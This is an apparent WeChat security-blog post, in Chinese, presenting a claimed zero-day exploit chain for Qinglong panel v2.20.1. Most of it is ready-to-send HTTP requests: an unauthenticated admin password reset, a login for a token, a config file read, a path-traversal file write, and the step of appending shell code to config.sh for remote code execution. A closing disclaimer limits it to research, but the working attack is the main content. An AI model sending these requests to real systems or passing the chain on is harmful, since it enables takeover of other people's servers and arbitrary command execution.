---
title: 【0day】青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞
url: https://mp.weixin.qq.com/s/mYYFlYXkfyruSsDbg7v9zg
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:54:23.042607
---

# 【0day】青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZrTsB3aQgWCEJLuPAycpHOTrGMzUaqjIiankicV3FPOXAWYJAVbx6oZtI2WcgXO7Ria6EOOdegrgD0OwglXfQlOSgWD9wvPjEIRpibAKjrVvERE/0?wx_fmt=jpeg)

# 【0day】青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞

0day收割机

![]()

在小说阅读器中沉浸阅读

# 漏洞复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWATCsr8nsYWRX8dqOHKQWRlQI2XuTyQn4TLGDh0EEFVLRa6MPaDRibhhDVHZIicyzKUVCfXGzt3yzDrjcTyqvNdktzhKOibicZQgG0/640?wx_fmt=png&from=appmsg)

## 获取状态

```
GET /api/health HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
Accept: */*
Host: localhost:5700
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWARDJB4XX88mE0OxYhZ8iaiasplyPYM9apVyqozx62Q7OsANbPn2ibQhdbDvCnx7WlTicljTRE2E0YGicpvI0mtzUfslASNgPByUeA8/640?wx_fmt=png&from=appmsg)

## 获取版本

```
GET /api/system HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
Accept: */*
Host: localhost:5700
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWAEe2g03bAIxL7ib7JHFmco4ic2zy2zFgu01HBRyyJQx36k5H3EzHE4HWgrcyhuTUliaNDNK1nHxtaLJWvAJHTeRdDbS4DHknd72Q/640?wx_fmt=png&from=appmsg)

## 重置密码

```
PUT /open/user/init HTTP/1.1
Host: 127.0.0.1:5700
Content-Type: application/json

{"username":"admin","password":"admin@qq.com"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWAgyA4bF8qicuRJewNagJoeia5Qq5kjfdIwUKZLhlGV6KwVAHpFeZNdDcqZqB2um7kFA2ah8d9IskFEkNQzvPvIK0v92BseNNRwM/640?wx_fmt=png&from=appmsg)

## 登录获取token

```
POST /api/user/login HTTP/1.1
Host: 127.0.0.1:5700
Content-Type: application/json

{"username":"admin","password":"admin@qq.com"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWAVuA7VKycvKRicKoMLiciaEic1zxjcpsqgRjy6ZolUTTIM5ibPoOuC1icU3pjp57tcJMfZCuRWic0xfK1QKeiaics1r6A6AIKVum3hwWJA/640?wx_fmt=png&from=appmsg)

## 文件读取

```
GET /api/configs/config.sh HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiQnI5MWh6R1FGckZtdnk3LUtGZWRscnlZbjVENmNXOVVkLVBnTUNXNTNCem5Dcy1JS0NwZzQ2WXJnOWYiLCJpYXQiOjE3NzIxNjA5OTQsImV4cCI6MTc3Mzg4ODk5NH0.K0Bm0bZuBzrSHMMxDwp0gQsQEMBt1hM6Ya0hrhtLuVHHhCWRZn15v4nuxIDbdQ1A
User-Agent: iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)
Accept: */*
Host: localhost:5700
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWD8FtekgzVG6SD8KZibictrvkiblphPpCOrFhvPJfFNWVhOZez0SWMoPjRwKJvdr0pnK9vcLsaJAjzDftYQGRzKNnia8HVGVGtWz28/640?wx_fmt=png&from=appmsg)

或者这种方式 `/api/configs/detail?path=config.sh`

## 文件保存+路径穿越

```
POST /api/configs/save HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiQnI5MWh6R1FGckZtdnk3LUtGZWRscnlZbjVENmNXOVVkLVBnTUNXNTNCem5Dcy1JS0NwZzQ2WXJnOWYiLCJpYXQiOjE3NzIxNjA5OTQsImV4cCI6MTc3Mzg4ODk5NH0.K0Bm0bZuBzrSHMMxDwp0gQsQEMBt1hM6Ya0hrhtLuVHHhCWRZn15v4nuxIDbdQ1A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
Host: localhost:5700
Content-Type: application/json

{
    "name": "../.././../../../tmp/vuln",
    "content": "vuln_test"
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWBGCmKatk1OfYRJvrDpiaWox2Rklkd7QZoR76HbAu1kXP2mT89fAUXk7RpVKM66icvCgWT85N4soud2QbzLwgJJt1A5BjfWIhjyo/640?wx_fmt=png&from=appmsg)

或者修改 config.sh 达到RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWBIMGiaPZCicdOPg2kpKv5E1kxtIw3jaavuaibmH7drclL2vgPoFVuSwB2ehicbMDy5UbEOHMF1aUypaIT7DdeIqA5v8rT48oK8nwA/640?wx_fmt=png&from=appmsg)

通过在 config.sh 后增加shell代码即可在任务触发时被自动执行。

## RCE

如修改 config.sh 追加 `\ntouch /tmp/hacked` 保存后，任意任务触发均可执行

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBqwEuCHeOyaOr3AS3NRkMwlsvGO8uibjfIp5qicThbVwO7GTmNCFYMbA6oHdckvYF6TSibf37LApicavUDicv6jUtqfHiaaImYwPIYM/640?wx_fmt=png&from=appmsg)

仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过